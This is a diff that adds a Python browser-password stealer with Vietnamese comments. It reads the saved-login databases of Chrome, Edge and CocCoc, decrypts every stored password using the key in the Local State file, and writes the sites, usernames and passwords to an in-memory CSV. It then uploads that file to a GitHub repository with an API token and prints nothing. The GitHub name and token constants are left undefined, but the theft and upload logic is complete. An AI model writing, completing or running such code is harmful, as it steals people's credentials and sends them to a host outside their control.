@@ -1,0 +1,115 @@
+import os
+import sqlite3
+import json
+import base64
+import shutil
+import csv
+import win32crypt
+import requests
+from Cryptodome.Cipher import AES
+from datetime import datetime
+from io import StringIO
+
+
+# Danh sách trình duyệt và đường dẫn mặc định
+BROWSERS = {
+    "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+    "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+    "CocCoc": os.path.expanduser("~") + r"\AppData\Local\CocCoc\Browser\User Data\Default\Login Data"
+}
+
+LOCAL_STATE_PATHS = {
+    "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State",
+    "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State",
+    "CocCoc": os.path.expanduser("~") + r"\AppData\Local\CocCoc\Browser\User Data\Local State"
+}
+
+def get_encryption_key(local_state_path):
+    """Lấy key giải mã từ file Local State"""
+    with open(local_state_path, "r", encoding="utf-8") as file:
+        local_state = json.load(file)
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    encrypted_key = encrypted_key[5:]  # Bỏ đi 5 byte đầu tiên
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_password(encrypted_password, key):
+    """Giải mã mật khẩu đã mã hóa"""
+    try:
+        if encrypted_password[:3] == b'v10':  # Kiểm tra phiên bản mã hóa
+            iv = encrypted_password[3:15]
+            encrypted_password = encrypted_password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(encrypted_password)[:-16].decode("utf-8")  # Bỏ đi tag xác thực
+        else:
+            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
+    except Exception as e:
+        return f"[LỖI GIẢI MÃ: {e}]"
+
+def extract_passwords():
+    """Tự động quét tất cả trình duyệt có trên máy và tải lên GitHub"""
+    all_data = []
+    
+    for browser, path in BROWSERS.items():
+        if os.path.exists(path):
+            local_state_path = LOCAL_STATE_PATHS[browser]
+            key = get_encryption_key(local_state_path)
+
+            copy_path = f"{browser}_LoginData.db"
+            shutil.copy2(path, copy_path)  # Copy file để tránh lỗi khóa
+            conn = sqlite3.connect(copy_path)
+            cursor = conn.cursor()
+
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            data = cursor.fetchall()
+
+            for row in data:
+                url, username, encrypted_password = row
+                password = decrypt_password(encrypted_password, key)
+                all_data.append([browser, url, username, password])
+
+            conn.close()
+            os.remove(copy_path)
+
+    # Ghi dữ liệu vào file CSV trong bộ nhớ (không lưu file trên máy)
+    csv_output = StringIO()
+    writer = csv.writer(csv_output)
+    writer.writerow(["DANH SÁCH MẬT KHẨU CÁC TRÌNH DUYỆT"])
+    writer.writerow([f"Thời gian xuất: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"])
+    writer.writerow([])
+    writer.writerow(["STT", "Trình duyệt", "Website", "Tài khoản", "Mật khẩu"])
+
+    for index, row in enumerate(all_data, start=1):
+        writer.writerow([index] + row)
+
+    # Upload lên GitHub
+    upload_to_github(csv_output.getvalue())
+
+def upload_to_github(file_content):
+    """Tải file CSV lên GitHub"""
+    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FILE_PATH}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+
+    # Kiểm tra file có tồn tại không
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        sha = response.json()["sha"]  # Lấy SHA để cập nhật file
+    else:
+        sha = None
+
+    # Gửi request để tạo/cập nhật file
+    data = {
+        "message": "Upload mật khẩu",
+        "content": base64.b64encode(file_content.encode()).decode(),
+        "branch": "master"
+    }
+    if sha:
+        data["sha"] = sha  # Cập nhật file nếu đã tồn tại
+
+    response = requests.put(url, headers=headers, json=data)
+    if response.status_code in [200, 201]:
+        print()
+    else:
+        print() 
+
+if __name__ == "__main__":
+    extract_passwords()
